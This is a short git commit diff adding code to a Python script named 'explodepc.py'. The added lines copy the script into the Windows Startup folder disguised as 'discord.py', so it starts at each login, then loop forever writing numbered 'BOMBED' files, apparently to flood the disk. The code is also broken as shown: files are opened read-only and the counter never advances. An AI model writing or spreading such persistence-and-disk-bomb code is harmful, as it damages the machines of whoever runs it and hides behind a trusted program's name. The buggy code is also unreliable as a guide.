48f1c1c363b5090ce9b8ab1526c067caa6ed9a5e
gamestartergame <113556662+gamestartergame@users.noreply.github.com>
2024-03-09 19:35:44 +0000

    Update explodepc.py

--- explodepcfiles/explodepc.py
+++ explodepcfiles/explodepc.py
@@ -5,4 +5,10 @@ import random
 import shutil
 import pynput
 import time
+login =os.getlogin()
+shutil.copy("explodepc.py" , "C:/Users/"+login+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/discord.py")
+i = 1
+while True:
 
+ with open(str(i) + "discord.txt") as file:
+  file.write("BOMBED")
